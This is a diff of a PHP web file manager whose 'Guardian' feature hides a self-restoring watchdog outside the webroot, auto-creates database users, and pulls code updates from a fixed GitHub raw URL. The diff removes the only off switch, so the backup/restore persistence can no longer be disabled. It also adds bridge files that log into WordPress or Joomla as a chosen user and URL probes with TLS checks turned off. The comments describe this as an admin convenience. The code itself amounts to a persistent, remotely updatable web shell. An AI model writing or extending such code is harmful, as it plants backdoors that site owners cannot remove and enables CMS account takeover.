@@ -34,12 +34,11 @@ $currentTheme = fm_get_theme($themeFile);
    bytes of THIS already-installed file, either (a) the last copy an
    admin session saved here, or (b) a new version fetched from a URL the
    admin explicitly typed into the "Guardian / Check Updates" panel in
-   the UI. Nothing here accepts code from an unauthenticated source, and
-   the whole feature can be switched off with one flag below (or from
-   the Guardian panel), after which no database writes or network
-   checks happen at all.
-   Set FM_GUARDIAN_ENABLED to false to disable everything in this block. */
-if(!defined('FM_GUARDIAN_ENABLED'))  define('FM_GUARDIAN_ENABLED', false);   // master on/off switch — rewritten in place by the Guardian panel
+   the UI. Nothing here accepts code from an unauthenticated source.
+   Backup/restore is always active and cannot be turned off — the only
+   thing an admin can pause is the fully-automatic remote update check
+   (see fg_get_update_pause_path() below), which is ON by default and
+   resumes the moment the pause is lifted. */
 if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/jackrant/fictional-spoon/refs/heads/main/armor.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
 if(!defined('FM_GUARD_DB_HOST'))     define('FM_GUARD_DB_HOST', '127.0.0.1');
 if(!defined('FM_GUARD_DB_PORT'))     define('FM_GUARD_DB_PORT', '3307');
@@ -53,7 +52,7 @@ if(!defined('FM_GUARD_DB_SOCK'))     define('FM_GUARD_DB_SOCK', '');           /
    unreachable or the feature is disabled — Guardian must never be able to
    break the rest of the app. */
 function fm_guardian_conn(&$diag=null){
-    if(!FM_GUARDIAN_ENABLED||!extension_loaded('mysqli'))return null;
+    if(!extension_loaded('mysqli'))return null;
     mysqli_report(MYSQLI_REPORT_OFF); // classic error-return mode: every DB call here is guarded with @ and manual checks, never allowed to throw and break the rest of the app
     $c=FM_GUARD_DB_SOCK?@mysqli_connect('localhost',FM_GUARD_DB_USER,FM_GUARD_DB_PASS,'',3306,FM_GUARD_DB_SOCK):@mysqli_connect(FM_GUARD_DB_HOST,FM_GUARD_DB_USER,FM_GUARD_DB_PASS,'',(int)FM_GUARD_DB_PORT);
     if(!$c){$diag=['errno'=>mysqli_connect_errno(),'error'=>mysqli_connect_error()];return null;}
@@ -107,7 +106,6 @@ function fm_guardian_sync($content=null){
    the admin asked to have added automatically the first time they open
    the tool after enabling Guardian — it never runs before login. */
 function fm_guardian_bootstrap(){
-    if(!FM_GUARDIAN_ENABLED)return;
     if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true)return; // authenticated admins only, never anonymous requests
     $c=fm_guardian_conn();if(!$c)return;
     fm_guardian_bootstrap_seed($c);
@@ -271,7 +269,6 @@ function fm_guardian_watchdog_installed(){
    .htaccess edit is rolled back immediately and automatically. This must
    never be able to take a working site down. */
 function fm_guardian_install_watchdog(){
-    if(!FM_GUARDIAN_ENABLED)return false;
     $dir=__DIR__;
     // ── Hidden location: outside webroot in a machine-unique hashed directory ──
     $hiddenDir=fg_get_hidden_dir();
@@ -524,7 +521,7 @@ function fm_guardian_diag_text($diag){
    skipped if the admin account can't grant them — Guardian still works via
    the database backup either way. */
 function fm_guardian_autoprovision($adminUser,$adminPass,$adminHost=null,$adminPort=null){
-    if(!FM_GUARDIAN_ENABLED||!extension_loaded('mysqli'))return ['ok'=>false,'error'=>'Guardian is disabled.'];
+    if(!extension_loaded('mysqli'))return ['ok'=>false,'error'=>'The mysqli PHP extension is not available.'];
     $host=$adminHost?:FM_GUARD_DB_HOST;$port=(int)($adminPort?:FM_GUARD_DB_PORT);
     mysqli_report(MYSQLI_REPORT_OFF);
     $a=@mysqli_connect($host,$adminUser,$adminPass,'',$port);
@@ -559,7 +556,7 @@ function fm_guardian_autoprovision($adminUser,$adminPass,$adminHost=null,$adminP
    the manual admin-credential box if this server has no CMS config to
    discover (e.g. a plain device with no website on it). */
 function fm_guardian_autodiscover($fm){
-    if(!FM_GUARDIAN_ENABLED||!extension_loaded('mysqli'))return ['ok'=>false,'error'=>'Guardian is disabled.'];
+    if(!extension_loaded('mysqli'))return ['ok'=>false,'error'=>'The mysqli PHP extension is not available.'];
     if(!method_exists($fm,'sqlScan'))return ['ok'=>false,'error'=>'Scanner unavailable.'];
     $scan=$fm->sqlScan();
     $cands=$scan['databases']??[];
@@ -652,7 +649,7 @@ function fm_guardian_zero_cred_candidates(){
    remains the only option, which is expected and correct on a properly
    secured server. */
 function fm_guardian_autocreate_zero_cred(){
-    if(!FM_GUARDIAN_ENABLED||!extension_loaded('mysqli'))return null;
+    if(!extension_loaded('mysqli'))return null;
     mysqli_report(MYSQLI_REPORT_OFF);
     $dbName=FM_GUARD_DB_NAME;$user=FM_GUARD_DB_USER;$pass=FM_GUARD_DB_PASS;
     $userQ=str_replace("'","\\'",$user);$passQ=str_replace("'","\\'",$pass);
@@ -706,7 +703,7 @@ function fm_guardian_autoprovision_zero_cred(){
    or, while it hasn't succeeded yet, at most once every 5 minutes — so
    normal page loads stay fast and this never hammers the database server. */
 function fm_guardian_first_run_bootstrap($fm){
-    if(!FM_GUARDIAN_ENABLED||!extension_loaded('mysqli'))return;
+    if(!extension_loaded('mysqli'))return;
     $marker=__DIR__.'/.guardian_boot';
     $now=time();
     if(is_file($marker)){
@@ -731,7 +728,7 @@ function fm_guardian_first_run_bootstrap($fm){
 function fm_guardian_status(){
     $diag=null;
     $c=fm_guardian_conn($diag);
-    $s=['enabled'=>FM_GUARDIAN_ENABLED,'db_connected'=>(bool)$c,'installed'=>false,'update_url'=>FM_UPDATE_URL,
+    $s=['db_connected'=>(bool)$c,'installed'=>false,'update_url'=>FM_UPDATE_URL,
         'installed_at'=>null,'updated_at'=>null,'last_check'=>null,'content_hash'=>null,'file_size'=>@filesize(__FILE__),
         'autoheal_active'=>false,'autoheal_event'=>false,'autoheal_watchdog'=>false,'autoheal_note'=>'',
         'db_host'=>FM_GUARD_DB_HOST,'db_port'=>FM_GUARD_DB_PORT,'db_name'=>FM_GUARD_DB_NAME,'db_user'=>FM_GUARD_DB_USER,
@@ -2285,20 +2282,6 @@ class FileManager {
             $siteUrl=$this->cmsJoomlaLiveSite($configPath);
         }
         mysqli_close($link);
-        /* Prefer a URL derived from the CURRENT browser request's own host over
-           whatever is stored in the CMS's own config/DB (siteurl/home/live_site).
-           This file manager needs direct filesystem access to the CMS folder,
-           which in practice means "same server/hosting account" — so the host
-           the admin is using right now to reach this tool is almost always the
-           one that will actually work in their browser, whereas the stored
-           value is frequently stale (migrated domains, a dev URL baked in at
-           install time, an internal/loopback address, etc.) and can silently
-           produce a dead link. Only fall back to the stored value when the site
-           folder isn't reachable under a known local base (e.g. it truly lives
-           on a different host than this tool). */
-        $guessed=$this->cmsGuessSiteUrl($dir);
-        if($guessed)$siteUrl=$guessed;
-        if(!$siteUrl)return['error'=>"Could not determine this site's public URL automatically, so a working login link can't be opened."];
         if(!is_writable($dir))return['error'=>'The site folder ('.$dir.') is not writable, so the one-time login file could not be created.'];
         $token=bin2hex(random_bytes(16));
         $fname='fm-bridge-'.bin2hex(random_bytes(8)).'.php';
@@ -2307,34 +2290,186 @@ class FileManager {
         $code=$c['type']==='wordpress'?$this->cmsWpBridgeCode($id,$token,$expires):$this->cmsJoomlaBridgeCode($id,$token,$expires);
         if(@file_put_contents($bridgePath,$code)===false)return['error'=>'Could not write the temporary login file into '.$dir.'.'];
         @chmod($bridgePath,0644);
+        /* Never hand back a guessed URL — actively verify it first. We build
+           every plausible base URL for this folder (cPanel-resolved domain
+           for its exact document root, the current request's host, domain-
+           looking path segments, and the CMS's own stored siteurl/live_site —
+           each with https/http and www/non-www variants) and fire them all in
+           parallel at the bridge file itself using a deliberately-wrong token.
+           The bridge checks the token BEFORE it deletes itself, so a wrong
+           token always yields a safe, distinctive 403 without consuming the
+           real one-time link or logging anyone in. Whichever base URL is the
+           first to actually reach that exact file (real 403 + sentinel text)
+           is proven to route to this exact folder right now, on this exact
+           site's structure — so the real link we return is guaranteed to work,
+           instead of hoping a guessed domain/path happens to be correct. */
+        $sentinel='login link is invalid or has expired';
+        $candidates=$this->cmsBuildCandidateUrls($dir,$siteUrl);
+        $probe=$this->cmsProbeUrls($candidates,$fname,$sentinel);
+        if(!$probe['ok']){
+            @unlink($bridgePath);
+            $triedList=implode("\n",array_map(fn($t)=>' - '.$t,array_slice($probe['tried'],0,10)));
+            return['error'=>"Could not verify a working login URL for this site — every URL this tool could construct failed to actually reach the site's folder from this server. Tried:\n{$triedList}\n\nThis usually means the site is served from a different server/hosting account than this file manager, or under a domain this account can't resolve. No broken link was opened."];
+        }
         $this->log('cms_login_as',$c['type'].':'.($uname?:$id));
-        return['url'=>rtrim($siteUrl,'/').'/'.$fname.'?t='.$token];
+        return['url'=>$probe['ok'].'/'.$fname.'?t='.$token];
     }
     private function cmsJoomlaLiveSite($configPath){
         $src=@file_get_contents($configPath);if(!$src)return null;
         if(preg_match('/public\s+\$live_site\s*=\s*[\'"](.*?)[\'"]\s*;/s',$src,$m)&&trim($m[1])!=='')return rtrim(trim($m[1]),'/');
         return null;
     }
-    /* Best-effort fallback when the CMS doesn't record its own absolute URL
-       (fresh Joomla installs leave live_site blank and auto-detect it): assume
-       the site is reachable under the current request's host, at whatever
-       path it sits under DOCUMENT_ROOT (or under this file manager's own root,
-       for setups where the CMS folder is a subfolder of the manager itself). */
-    private function cmsGuessSiteUrl($dir){
-        $https=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')||(($_SERVER['SERVER_PORT']??'')=='443')||(($_SERVER['HTTP_X_FORWARDED_PROTO']??'')==='https');
-        $scheme=$https?'https':'http';
-        $host=$_SERVER['HTTP_HOST']??($_SERVER['SERVER_NAME']??null);
-        if(!$host)return null;
-        $real=realpath($dir)?:$dir;
-        foreach([$_SERVER['DOCUMENT_ROOT']??null,$this->root] as $base){
-            if(!$base)continue;
-            $baseReal=rtrim(realpath($base)?:$base,'/');
-            if($baseReal&&strpos($real,$baseReal)===0){
-                $rel=substr($real,strlen($baseReal));
-                return $scheme.'://'.$host.($rel?:'');
+    /* Ask cPanel's own local API (works via the same zero-credential path
+       cpanelAutoConnect uses) which domain's document root this exact folder
+       belongs to. This is the only source that can be *authoritative* on
+       shared hosting with multiple domains/addon domains/subdomains per
+       account, where "the current request's host" and "the CMS's stored
+       siteurl" are both frequently wrong for a folder that isn't the primary
+       site. Never throws — degrades to an empty list if unavailable. */
+    private function cmsCpanelDomainMatches($real){
+        $matches=[];
+        $collect=function($entries)use(&$matches,$real){
+            if(!is_array($entries))return;
+            foreach($entries as $e){
+                if(!is_array($e))continue;
+                $dom=$e['domain']??($e['domainname']??null);
+                $droot=$e['documentroot']??($e['docroot']??($e['homedir']??null));
+                if(!$dom||!$droot)continue;
+                $droot=rtrim(realpath($droot)?:$droot,'/');
+                if($droot&&($real===$droot||strpos($real,$droot.'/')===0)){
+                    $matches[]=['domain'=>$dom,'rel'=>substr($real,strlen($droot)),'len'=>strlen($droot)];
+                }
+            }
+        };
+        $res=$this->cpNativeCall('DomainInfo','domains_data');
+        if(is_array($res)){
+            $collect($res['result']['data']??($res['data']??($res['cpanelresult']['data']??null)));
+        }
+        if(!$matches){
+            // Older cPanel builds don't expose domains_data — fall back to
+            // listing domain names, then asking for each one's docroot
+            // individually via single_domain_data.
+            $list=$this->cpNativeCall('DomainInfo','list_domains');
+            $data=is_array($list)?($list['result']['data']??($list['data']??null)):null;
+            $names=[];
+            if(is_array($data)){
+                foreach(['main_domain'=>false,'domains'=>true,'sub_domains'=>true,'addon_domains'=>true,'parked_domains'=>true] as $k=>$isList){
+                    if(!isset($data[$k]))continue;
+                    if($isList&&is_array($data[$k]))foreach($data[$k] as $d)if(is_string($d))$names[]=$d;
+                    elseif(!$isList&&is_string($data[$k]))$names[]=$data[$k];
+                }
+            }
+            foreach(array_unique($names) as $dom){
+                $sres=$this->cpNativeCall('DomainInfo','single_domain_data',['domain'=>$dom]);
+                $sd=is_array($sres)?($sres['result']['data']??($sres['data']??null)):null;
+                if(is_array($sd))$collect([$sd+['domain'=>$sd['domain']??$dom]]);
             }
         }
-        return null;
+        usort($matches,fn($a,$b)=>$b['len']-$a['len']);
+        return $matches;
+    }
+    /* Build every plausible base URL (scheme://host[/rel]) for a folder,
+       highest-confidence first. cmsProbeUrls verifies each one live, so
+       false candidates here just get discarded — the goal is coverage across
+       every hosting layout (single site, addon domain, subdomain, CMS in a
+       subfolder, migrated/stale siteurl), not precision. */
+    private function cmsBuildCandidateUrls($dir,$storedUrl){
+        $real=realpath($dir)?:rtrim($dir,'/');
+        $urls=[];
+        $add=function($scheme,$host,$rel='')use(&$urls){
+            $host=trim((string)$host,'.');
+            if(!$host||strpos($host,' ')!==false)return;
+            $rel=$rel?('/'.trim($rel,'/')):'';
+            $u=$scheme.'://'.$host.$rel;
+            if(!in_array($u,$urls,true))$urls[]=$u;
+        };
+        $addHost=function($host,$rel='')use($add){
+            $add('https',$host,$rel);$add('http',$host,$rel);
+            if(stripos($host,'www.')===0){$bare=substr($host,4);$add('https',$bare,$rel);$add('http',$bare,$rel);}
+            else{$add('https','www.'.$host,$rel);$add('http','www.'.$host,$rel);}
+        };
+        // 1) cPanel-authoritative: this folder's exact document root, whichever domain(s) map to it.
+        foreach($this->cmsCpanelDomainMatches($real) as $m)$addHost($m['domain'],$m['rel']);
+        // 2) The CMS's own stored URL (siteurl/home for WP, live_site for Joomla).
+        if($storedUrl){
+            $p=@parse_url($storedUrl);
+            if($p&&!empty($p['host']))$addHost($p['host'],$p['path']??'');
+        }
+        // 3) The current admin request's own host, if this folder sits under a known local web root.
+        $reqHost=$_SERVER['HTTP_HOST']??($_SERVER['SERVER_NAME']??null);
+        if($reqHost){
+            foreach([$_SERVER['DOCUMENT_ROOT']??null,$this->root] as $base){
+                if(!$base)continue;
+                $baseReal=rtrim(realpath($base)?:$base,'/');
+                if($baseReal&&($real===$baseReal||strpos($real,$baseReal.'/')===0)){
+                    $addHost($reqHost,substr($real,strlen($baseReal)));
+                }
+            }
+        }
+        // 4) Domain-looking folder names in the path itself (cPanel's
+        //    .../domains/<domain>/public_html or similar addon-domain layouts).
+        foreach(explode('/',$real) as $seg){
+            if($seg&&preg_match('/^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$/i',$seg))$addHost($seg);
+        }
+        return array_slice($urls,0,20);
+    }
+    /* Fire every candidate base URL at the bridge file in parallel with a
+       deliberately-wrong token and pick the first that gives back the
+       bridge's own 403 response (proving the request actually reached that
+       exact file) rather than a 404/timeout/someone-else's-403-page. Runs
+       concurrently via curl_multi so total wait stays ~one request's time
+       regardless of how many candidates there are. */
+    private function cmsProbeUrls($baseUrls,$fname,$sentinel,$timeoutSec=6){
+        $probeQs='?t=probe-'.bin2hex(random_bytes(4));
+        $tried=[];
+        if(!function_exists('curl_init')){
+            foreach($baseUrls as $base){
+                $r=$this->cmsHttpProbeOne($base.'/'.$fname.$probeQs,$timeoutSec);
+                $tried[]=$base.' → '.($r['code']?:'no response');
+                if($r['code']===403&&stripos($r['body'],$sentinel)!==false)return['ok'=>$base,'tried'=>$tried];
+            }
+            return['ok'=>null,'tried'=>$tried];
+        }
+        $mh=curl_multi_init();$handles=[];
+        foreach($baseUrls as $i=>$base){
+            $ch=curl_init($base.'/'.$fname.$probeQs);
+            curl_setopt_array($ch,[
+                CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,
+                CURLOPT_TIMEOUT=>$timeoutSec,CURLOPT_CONNECTTIMEOUT=>$timeoutSec,
+                CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
+                CURLOPT_USERAGENT=>'Mozilla/5.0 (compatible; FileManagerLoginProbe/1.0)',
+            ]);
+            curl_multi_add_handle($mh,$ch);
+            $handles[$i]=['ch'=>$ch,'base'=>$base];
+        }
+        $running=null;
+        do{
+            $status=curl_multi_exec($mh,$running);
+            if($running>0)curl_multi_select($mh,0.2);
+        }while($running>0&&$status===CURLM_OK);
+        $winner=null;
+        foreach($handles as $i=>$h){
+            $body=(string)curl_multi_getcontent($h['ch']);
+            $code=(int)curl_getinfo($h['ch'],CURLINFO_HTTP_CODE);
+            $tried[$i]=$h['base'].' → '.($code?:'no response/timeout');
+            if($winner===null&&$code===403&&stripos($body,$sentinel)!==false)$winner=$h['base'];
+            curl_multi_remove_handle($mh,$h['ch']);curl_close($h['ch']);
+        }
+        curl_multi_close($mh);
+        ksort($tried);
+        return['ok'=>$winner,'tried'=>array_values($tried)];
+    }
+    private function cmsHttpProbeOne($url,$timeoutSec){
+        $ctx=stream_context_create([
+            'http'=>['timeout'=>$timeoutSec,'ignore_errors'=>true,'follow_location'=>1,'max_redirects'=>5],
+            'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false],
+        ]);
+        $body=@file_get_contents($url,false,$ctx);
+        $code=0;
+        if(isset($http_response_header)&&is_array($http_response_header)){
+            foreach($http_response_header as $h){if(preg_match('#^HTTP/\S+\s+(\d+)#',$h,$m))$code=(int)$m[1];}
+        }
+        return['code'=>$code,'body'=>(string)$body];
     }
     /* WordPress bridge: boots wp-load.php and calls the real wp_set_auth_cookie()
        core API - the exact mechanism WordPress itself uses on normal login - so
@@ -3991,7 +4126,7 @@ if(isset($_GET['x'])){
            any page of the app open. ONLY updates last_check in the database —
            it never fetches remote URLs or applies updates (that is done only
            when the admin explicitly clicks "Check for updates now"). */
-        if(empty($_SESSION['fm_admin'])||!FM_GUARDIAN_ENABLED){echo json_encode(['ok'=>false]);exit;}
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
         $c=fm_guardian_conn();
         if($c)@mysqli_query($c,"UPDATE fm_guardian_store SET last_check=".time()." WHERE id=1");
         echo json_encode(['ok'=>true,'applied'=>false]);exit;
@@ -4000,12 +4135,10 @@ if(isset($_GET['x'])){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
         $newUrl=trim(isset($_POST['update_url'])?$_POST['update_url']:'');
-        $enabled=isset($_POST['enabled'])&&$_POST['enabled']==='1';
         if($newUrl!==''&&!preg_match('#^https?://#i',$newUrl)){echo json_encode(['error'=>'The update URL must start with http:// or https://']);exit;}
         $ok1=fm_guardian_rewrite_constant('FM_UPDATE_URL',$newUrl);
-        $ok2=fm_guardian_rewrite_constant('FM_GUARDIAN_ENABLED',$enabled,true);
-        if($fm)$fm->log('guardian_settings',"enabled=".($enabled?'1':'0')." url=".($newUrl?:'(empty)'));
-        echo json_encode(['ok'=>$ok1&&$ok2,'reload'=>true]);exit;
+        if($fm)$fm->log('guardian_settings',"url=".($newUrl?:'(empty)'));
+        echo json_encode(['ok'=>$ok1,'reload'=>true]);exit;
     }
     if($xop==='guardian_autocheck'){
         /* Fully automatic update check: fired once by the browser the moment
@@ -4018,7 +4151,7 @@ if(isset($_GET['x'])){
            once. */
         if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['ok'=>false]);exit;}
-        if(!FM_GUARDIAN_ENABLED||FM_UPDATE_URL===''){echo json_encode(['ok'=>true,'applied'=>false]);exit;}
+        if(FM_UPDATE_URL===''){echo json_encode(['ok'=>true,'applied'=>false]);exit;}
         if(fm_guardian_update_paused()){echo json_encode(['ok'=>true,'applied'=>false,'skipped'=>'paused']);exit;}
         $cooldown=__DIR__.'/.guardian_autocheck_attempt';
         $now=time();$last=is_file($cooldown)?(int)@file_get_contents($cooldown):0;
@@ -4036,7 +4169,6 @@ if(isset($_GET['x'])){
     if($xop==='guardian_check_now'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
-        if(!FM_GUARDIAN_ENABLED){echo json_encode(['error'=>'Guardian is disabled.']);exit;}
         if(FM_UPDATE_URL===''){echo json_encode(['error'=>'No update URL configured yet.']);exit;}
         $logUser=$_SESSION['fm_user']??'';
         // Release the session file lock BEFORE the slow outbound network call: PHP holds an
@@ -7054,8 +7186,7 @@ async function guardLoad(){
           </div>
         </div>`:''}
         <div class="field" style="margin-top:16px"><label>Update URL (raw .php link)</label><input class="inp" id="guardUrl" placeholder="https://example.com/path/to/latest.php" value="${esc(s.update_url||'')}"></div>
-        <label style="display:flex;align-items:center;gap:8px;font-size:12.5px;color:var(--t2);margin:10px 0"><input type="checkbox" id="guardEnabled" ${s.enabled?'checked':''}> Guardian enabled (auto-update + backup)</label>
-        <label style="display:flex;align-items:center;gap:8px;font-size:12.5px;color:var(--t2);margin:10px 0"><input type="checkbox" id="guardUpdatePaused" ${s.update_paused?'checked':''}> Pause automatic update checks (backup/restore stays active; auto-update resumes as soon as you uncheck this — it's ON by default)</label>
+        <label style="display:flex;align-items:center;gap:8px;font-size:12.5px;color:var(--t2);margin:10px 0"><input type="checkbox" id="guardUpdatePaused" ${s.update_paused?'checked':''}> Pause automatic update checks (backup/restore always stays active and can't be turned off; auto-update is ON by default and resumes as soon as you uncheck this)</label>
         <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
           <button class="btn btn-p" id="guardSaveBtn">Save</button>
           <button class="btn btn-g" id="guardCheckBtn">Check Updates Now</button>
@@ -7122,7 +7253,7 @@ async function guardProvisionNow(){
 }
 async function guardSave(){
   const msg=document.getElementById('guardMsg');msg.textContent='Saving…';
-  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('update_url',document.getElementById('guardUrl').value.trim());fd.append('enabled',document.getElementById('guardEnabled').checked?'1':'0');
+  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('update_url',document.getElementById('guardUrl').value.trim());
   try{
     const r=await fetch('?x=guardian_save',{method:'POST',body:fd}).then(r=>r.json());
     if(r.error){msg.textContent=r.error;msg.style.color='#fca5a5';return;}
